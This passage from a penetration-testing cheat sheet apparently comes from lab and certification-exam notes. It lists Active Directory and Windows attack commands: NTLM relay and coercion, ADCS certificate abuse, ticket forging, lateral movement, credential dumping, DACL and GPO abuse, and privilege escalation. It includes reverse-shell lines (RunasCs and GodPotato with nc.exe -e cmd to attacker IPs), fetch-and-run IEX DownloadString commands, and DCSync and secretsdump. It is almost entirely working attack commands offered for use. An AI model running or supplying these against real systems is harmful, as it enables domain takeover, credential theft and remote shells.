sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" /etc/responder/Responder.conf
responder -I tun0

# ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c

# socks
## SMB
impacket-ntlmrelayx -smb2support -tf relayTargets.txt -socks
## MSSQL
impacket-ntlmrelayx -t "mssql://172.50.0.30" -smb2support -socks

# add computer
impacket-ntlmrelayx -t ldap://172.16.119.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
# PC account escalate
impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

# start relay
python3 PetitPotam.py -u 'plaintext$' -p 'Password123!' -d 'lab.local' <My_IP> 172.16.119.70
coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
```

### ESC 8
```bash
# HTTP Endpoint
curl -I http://172.16.117.3/certsrv/

# Relay
impacket-ntlmrelayx -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template "Machine"
# Authentication Coercion
coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 
python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
# pfx

echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
```
```bash
certipy relay -target "http://172.16.119.3" -template Machinene

coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 

certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
```
Silver Ticket 
```bash
impacket-lookupsid 'INLANEFREIGHT.LOCAL\backup01$'@172.16.119.3 -hashes :11d2b884b8b3383ace4a68b8e1d23a8f
impacket-ticketer -nthash 11d2b884b8b3383ace4a68b8e1d23a8f -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/backup01.inlanefreight.local Administrator

# vim /etc/hosts to backup01.inlanefreight.local
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass backup01.inlanefreight.local
```

### ESC11
```bash
certipy relay -target "rpc://172.16.119.3" -ca "INLANEFREIGHT-DC01-CA"

coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 

certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
```

## Inveigh
```powershell
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
Start-Job {Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y}
Start-Job {Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y}


wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.10/Inveigh-net4.6.2-v2.0.10.zip
unzip Inveigh-net4.6.2-v2.0.10.zip
Start-Job {.\Inveigh.exe -Console 5 -NBNS y -FileOutput y -LogOutput y}
Receive-Job -Id
Stop-Job -Id 
```
## PsExec
```powershell
wget https://download.sysinternals.com/files/PSTools.zip

.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

wget https://github.com/maaaaz/impacket-examples-windows/raw/master/psexec.exe
.\psexec.exe htb.local/tom_admin@10.10.164.146 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# OTH
net use \\files04
.\PsExec64.exe \\PC1 cmd --accepteula
```
## winRM
```powershell
# winrm
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

# winrs 
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "

# restrict ticket on host RDP
.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:
Enter-PSSession SRV02.oscp.exam -Authentication Negotiate
```
## DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e   ","7")

$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
```
## RunasCs
https://github.com/antonioCoco/RunasCs
```powershell
.\RunasCs.exe username password cmd.exe -r 10.10.14.83:7777
```
## TightVNC
https://github.com/frizb/PasswordDecrypts
```bash
reg query HKLM\SOFTWARE\TightVNC\Server /s
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

# Linux
apt-get install xtightvncviewer
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
```

## Invoke-TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash
```powershell
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators own_user /add"
```

# Discovery
## Windows
### LOLBIN
```powershell
# AD Module
Import-Module ActiveDirectory

# admin
Get-ADGroup -Filter "adminCount -eq 1" | select Name
# Group joined Harry Jones
Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL"'
Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' |select Name
# description
Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description
# SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# ASREPRoast
Get-ADUser -Filter {DoesNotRequirePreAuth -eq 'True'}
# trusted for delegation
Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# DACL
## Enum to user01
dsacls.exe ' CN=user01,CN=Users,DC=INLANEFREIGHT,DC=LOCAL'
```
### PowerView
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon <br/>
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview

Ghost<br/>
https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/Get-ConstrainedDelegation.ps1
```powershell
cd /usr/share/windows-resources/powersploit/Recon/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')

# cmd
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol
Get-NetSession -Verbose -ComputerName web04 

Get-LocalGroupMember Administrators
Find-LocalAdminAccess
Find-DomainUserLocation
Invoke-UserHunter
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# discription
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
# AS-REP-roastable
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
# Kerberoastable
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof
Invoke-Kerberoast

# Delegation 
## 制約なし
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" 
## 制約ある
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol,msds-allowedtodelegateto
## Ghost
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
Get-ConstrainedDelegation -CheckOrphaned

# GenericAll to User
$geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $geneall

# DCSync
$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync

# DACL
$userSID = (Get-DomainUser -Identity own_user).objectsid
Get-DomainObjectAcl -Identity target_user | ?{$_.SecurityIdentifier -eq $userSID}
```
### winPEAS
```powershell
# on nc.exe
cd /usr/share/peass/winpeas
iwr -Uri http:// -Outfile winPEASany.exe
# on powershell
iwr -Uri http:// -Outfile winPEAS.bat
```
### Powerless
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
```powershell
wget https://raw.githubusercontent.com/gladiatx0r/Powerless/master/Powerless.bat
```
### token
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```
### Sherlock
https://github.com/rasta-mouse/Sherlock
```powershell
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
```
### PrivescCheck
https://github.com/itm4n/PrivescCheck
```powershell
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
```

### Snaffler
Share Folder
```powershell
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe

.\Snaffler.exe -d oscp.exam -v data
```

### LaZagne
Credential Discovery
```powershell
.\lazagne.exe all
```

### BloodHound
#### Sharphound
```powershell
# Sharphound
cd /usr/share/sharphound/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"

.\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 

# rusthound
./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' -z --adcs --ldaps

# Bloodhound-python
bloodhound-python -c all -u enox -p california -d heist.offsec -ns 192.168.171.165 --zip
```
#### neo4j
```bash
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

# AS-REP-roastable
MATCH (u:User {dontreqpreauth: true}) RETURN u

# Kerberoastable 
MATCH (u:User) WHERE u.hasspn=true RETURN u

# WinRM
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# MSSQL SQLAdmin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# description
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u

# Delegation unconstrained
MATCH (c:Computer {unconstraineddelegation:true}) return c

# ANY PATH
MATCH p = shortestPath((n)-[*1..]->(c)) WHERE n.name =~ '(?i)ここにUser名.*' AND NOT c=n RETURN p
```

#### Userlist
```bash
jq '.nodes[].label'
```

### findDelegation
```bash
# vim /etc/hosts
impacket-findDelegation htb.LOCAL/user:pass
```

### cmd
```powershell
# Users file
tree /f
Get-ChildItem -force
# hidden tree
function Show-Tree {
    param (
        [string]$Path = ".",
        [int]$Level = 0
    )
    $indent = " " * ($Level * 2)
    Get-ChildItem -Path $Path -Force | ForEach-Object {
        Write-Output "$indent|- $_"
        if ($_.PSIsContainer) {
            Show-Tree -Path $_.FullName -Level ($Level + 1)
        }
    }
}
Show-Tree -Path "C:\Users"
# hidden
dir /a

#Path
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

# File Credential
Get-Childitem -Path C:\windows.old -Include *SAM -Recurse -force -ErrorAction SilentlyContinue

findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*

where /R C:\ *.config

# savecred
cmdkey /list
runas /savecred /user:oscp\bob "COMMAND HERE"

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Powershell History
(Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Powershell Passwsord XML
$credential = Import-Clixml -Path ".\connection.xml"
$credential.GetNetworkCredential().password

$secureString = $credential.Password
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
echo $plainTextPassword

$password = '01000000d08c9d...';
$secureString = ConvertTo-SecureString $password -Force;
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))

# Eventlog
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# install Service
wmic product get name

# Port
netstat -ano
tasklist /svc /FI "PID eq 336"

# Writeable folder
icacls C:\xampp\

# dpapi
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\
dir C:\Users\USER\AppData\Local\Microsoft\Protect\
.\SharpDPAPI.exe triage
## decrypt
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'pass' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fb

.\SharpDPAPI.exe credentials /password:'pass' /unprotect

# AD Delete Object
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
Restore-ADObject -Identity f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
Enable-ADAccount -Identity f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
```

## Linux
### cmd
```bash
# Port
ss -anp

# find
find / -writable -type d 2>/dev/null
find / -iname "*admin*" 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# cron
cd /etc/crond.d
```
### linpeas
```bash
cd /usr/share/peass/linpeas
```
### pspy
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
```

## Other
### git
```
# git dump
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper 
./gitdumper.sh http://pilgrimage.htb/.git/ web

# git
git clone https://github.com/arthaud/git-dumper
cd git-dumper 
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
./git_dumper.py http://pilgrimage.htb/.git/ web

# cmd
git status
git log
git show [commit]
git reset --hard
git checkout . 
```

# Privilege Escalation
## Windows
### PowerUp
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
```powershell
cd /usr/share/windows-resources/powersploit/Privesc/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')

# AllChecks
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks

# john Password123!

# Binary Hijacking
Get-ModifiableServiceFile
## AbuseFunction
Install-ServiceBinary -Name ''

# UnquotedService
Get-UnquotedService
## AbuseFunction  
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
### SharpUp
Ghostpack
```powershell
.\SharpUp.exe audit
```

### Abuse DACLs
#### Default
https://github.com/ShutdownRepo/impacket
https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py

Set SPN
GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN 
```powershell
# PowerView
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
Get-DomainUser target_user -SPN | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
Set-DomainObject -Identity target_user -Clear serviceprincipalname -Verbose
```
Reset Password
GenericAll, AllExtendedRights, User-Force-Change-Password
```powershell
Set-ADAccountPassword target_user -NewPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Reset -Verbose

# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Verbose
```
```linux
# net rpc
net rpc password target_user 'Password123!' -U inlanefreight.local/own_user%'Password1' -S 10.129.205.81

# rpcclient
rpcclient -U INLANEFREIGHT/own_user%Password1 10.129.205.81
setuserinfo2 target_user 23 Password123!
```
WriteDACL
```bash
# Group Add
python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write

net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81

# Password Reset
python3 examples/dacledit.py -principal own_user -target "kenta" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write

rpcclient -U INLANEFREIGHT/own_user%Password1 10.129.205.81
setuserinfo2 kenta 23 Password1
```

Own Target
```bash
python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action 'write'

net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81

# PowerView
Add-DomainGroupMember -Identity MicrosoftSync -Members remote_svc$ -Verbose
```

WriteOwner
```bash
impacket-owneredit -action write -new-owner own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1

python3 examples/dacledit.py -principal own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
```

#### Shadow Credential
GenericAll, GenericWrite WriteProperty 

https://github.com/ShutdownRepo/pywhisker <br/>
https://github.com/dirkjanm/PKINITtools
```bash
# Get pfx
python3 pywhisker.py -d "certified.htb" -u "JUDITH.MADER" -p "judith09" --target "MANAGEMENT_SVC" --action "add" --filename management

# In PKINITtools
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 gettgtpkinit.py -cert-pfx management.pfx -pfx-pass p9bX29Eozi8fT3CEpSvL certified.htb/MANAGEMENT_SVC MANAGEMENT_SVC.ccache
# key is in gettgtpkinit.py output
KRB5CCNAME=MANAGEMENT_SVC.ccache python3 getnthash.py -key c5b9e16f65d7f78cf15c8b185bfb75b2d1df367d1f3091392d336a7130669bef certified.htb/MANAGEMENT_SVC 
```
#### Script-Path
Enum
```bash
# permission
python examples/dacledit.py -principal own_user -target 'target' -dc-ip 10.129.229.224  inlanefreight.local/own_user:'pass'
smbcacls //10.129.229.224/NETLOGON /targetScripts -U own_user%'pass'

# scriptPath
ldapsearch -LLL -H ldap://10.129.229.224 -x -D 'own_user@inlanefreight.local' -w 'SecurePassJul!08' -b "DC=inlanefreight,DC=local" "(sAMAccountName=target)" scriptPath

# logon script and smbclient put
vim logon.bat
```
Modify
```bash
# logonScript.ldif
dn: CN=target,CN=Users,DC=inlanefreight,DC=local
changetype: modify
replace: scriptPath
scriptPath: targetScripts\logon.bat
```
```bash
ldapmodify -H ldap://10.129.229.224 -x -D 'own_user@inlanefreight.local' -w 'pass' -f logonScript.ldif
```

#### Hijack SPN
WriteSPN, WriteProperty, GenericWrite and Delegate
```powershell
##### Ghost
```powershell
# Hijack Ghost
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/Get-ConstrainedDelegation.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
Get-ConstrainedDelegation -CheckOrphaned
# WriteSPN
Get-DomainObjectAcl -Identity target_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
# SPN memo
Get-DomainComputer target_PC | Select-Object -ExpandProperty serviceprincipalname

# Set SPN
Set-DomainObject -Identity target_PC -Set @{serviceprincipalname='dhcp/Ghost_PC'} -Verbose

# Get Ticket
.\Rubeus.exe s4u /domain:inlanefreight.local /user:OWN_PC$ /rc4:OWN_PC /impersonateuser:administrator /msdsspn:"dhcp/Ghost_PC" /nowrap
.\Rubeus.exe tgssub /ticket:<ghost_ticket> /altservice:cifs/target_PC /nowrap
.\Rubeus.exe ptt /ticket:<new_ticket>
```
##### Live Hijack
```powershell
# Delegation
## Get Hijack PC
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
Get-ConstrainedDelegation
# WriteSPN
## Hijack PC
Get-DomainObjectAcl -Identity Hijack_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
## target_PC
Get-DomainObjectAcl -Identity target_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
# SPN memo
(Get-DomainComputer Hijack_PC).serviceprincipalname

# Clear SPN
Set-DomainObject -Identity Hijack_PC -Clear 'serviceprincipalname' -Verbose
# Set SPN
Set-DomainObject -Identity target_PC -Set @{serviceprincipalname='MSSQL/Hijack_PC'} -Verbose

# Get Ticket
## req rc4
.\Rubeus.exe hash /domain:inlanefreight.local /user:OWN_PC$ /password:'Password123!'
## Ticket by Rubeus
.\Rubeus.exe s4u /domain:inlanefreight.local /user:OWN_PC$ /rc4:OWN_PC /impersonateuser:administrator /msdsspn:"MSSQL/Hijack_PC" /nowrap
.\Rubeus.exe tgssub /ticket:<hijack_ticket> /altservice:HTTP/target_PC /nowrap
.\Rubeus.exe ptt /ticket:<new_ticket>
## Ticket by impacket
impacket-getST -spn 'MSSQLSvc/Hijack_PC' -impersonate Administrator 'inlanefreight.local/OWN_PC$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 172.19.99.10
### alt ticket
git clone -b tgssub https://github.com/ShutdownRepo/impacket/ tgssub
python3 tgssub/examples/tgssub.py -in 'Administrator@MSSQLSvc_db2000@INLANEFREIGHT.LOCAL.ccache' -altservice "cifs/target_PC" -out newticket.ccache 
#### vim /etc/hosts
KRB5CCNAME=newticket.ccache impacket-smbexec -k -no-pass SDE01


# Restore SPN
cat SPN.txt | awk '{printf "\x27%s\x27,", $0}'
## Remove hijack SPN
Set-DomainObject -Identity Hijack_PC -Set @{
serviceprincipalname=...
} -Verbose

# WinRM
Enter-PSSession -ComputerName target_PC
```

#### abuse GPO
https://github.com/juliourena/plaintext/blob/master/Powershell/Get-GPOEnumeration.ps1
```powershell
# Modify GPO priv
Get-GPOEnumeration
# Link GPOs priv
Get-GPOEnumeration -LinkGPOs
# Create GPO priv
Get-GPOEnumeration -CreateGPO

# where OU are PC
Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }

# Create GPO
New-GPO -Name TestGPO -Comment "This is a test GPO."
# Create GPO link
New-GPLink -Name TestGPO -Target "OU=TestOU,DC=inlanefreight,DC=local"

# Abuse GPO add local admin 
## --force
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount own_user --GPOName "TestGPO" 
```

### LOLBIN
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

# Binary Hijacking
## === Modifiable Service Binaries ===
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\mysql\bin\mysqld.exe"
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
net stop mysql
shutdown /r /t 0 

# tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

## Watch
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20

#checkcmdline
IEX (iwr 'http://10.10.10.205/check_cmdline.ps1') 

# Services
# === Modifiable Services ===
sc config WindscribeService binpath="cmd /c net localgroup administrators my /add"
sc stop WindscribeService
sc start WindscribeService
```
### token
```powershell
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
cd /usr/share/windows-resources/binaries/
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.83 9999 -e cmd"

# SharpToken
cd /usr/share/windows-resources/binaries/
.\SharpToken.exe list_token
.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
.\SharpToken.exe add_user admin Abcd1234! Administrators
```
### SePriv
#### Full Power
https://github.com/itm4n/FullPowers

#### Psgetsystem
https://github.com/decoder-it/psgetsystem

#### TakeOwn
https://github.com/fashionproof/EnableAllTokenPrivs

```powershell
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown

takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
#### BackupPrivilege
https://github.com/giuliano108/SeBackupPrivilege
```powershell 
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

https://book.hacktricks.xyz/v/jp/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
```powershell
#ntds.dit
C:\Windows\Temp> diskshadow.exe /s z.dsh
C:\Windows\Temp> robocopy /B z:\Windows\NTDS .\ntds ntds.dit

# SAM SYSTEM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM
```
z.dsh
```powershell
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
```
```bash
unix2dos z.dsh
```

#### LoadDriver
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
https://github.com/TarlogicSecurity/EoPLoadDriver/
https://github.com/musheebat/Compiled-capcom-exploit

```powershell
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
.\ExploitCapcom.exe
```
#### SeManageVolume
https://github.com/CsEnox/SeManageVolumeExploit
```bash
# Default
C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll

$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)

#DLL Hijacking
systeminfo
c:\windows\system32\wbem\tzres.dll
```

### PrintNightmare
https://github.com/calebstewart/CVE-2021-1675

### HiveNightmare
https://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6

### S4U
#### SpoolSample
https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
```powershell
 .\Rubeus.exe monitor /interval:5 /nowrap

.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator /domain:htb.local" "exit"

.\Rubeus.exe asktgt /rc4:NTLM /user:administrator /ptt /nowrap

dir \\dc01.inlanefreight.local\c$
```
#### krbrelayx
https://github.com/dirkjanm/krbrelayx
```bash
# 制約なし委任されてるUserへのGenericWriteがあればいける
## DNS
python dnstool.py -u INLANEFREIGHT.LOCAL\\genWuser -p passwd -r my.INLANEFREIGHT.LOCAL -d 10.10.14.224 --action add 10.129.205.35
# SPN registered
## vim /etc/hosts to connect to the dc01
python addspn.py -u inlanefreight.local\\genWuser -p passwd --target-type samname -t sqldev -s CIFS/my.inlanefreight.local dc01.inlanefreight.local

# recov tgt in tgs
python krbrelayx.py -s user -p 
python krbrelayx.py -s user -hashes :NTLM 

#printerBUG 
python printerbug.py inlanefreight.local/genWuer:passwd@10.129.205.35 my.inlanefreight.local

# DCsync
unset KRB5CCNAME
export KRB5CCNAME=./Administrator.ccache
impacket-secretsdump dc01.INLANEFREIGHT.LOCAL -k -no-pass -just-dc-user Administrator -just-dc-ntlm
```
#### DC-Constrained Delegation
```bash
unset KRB5CCNAME
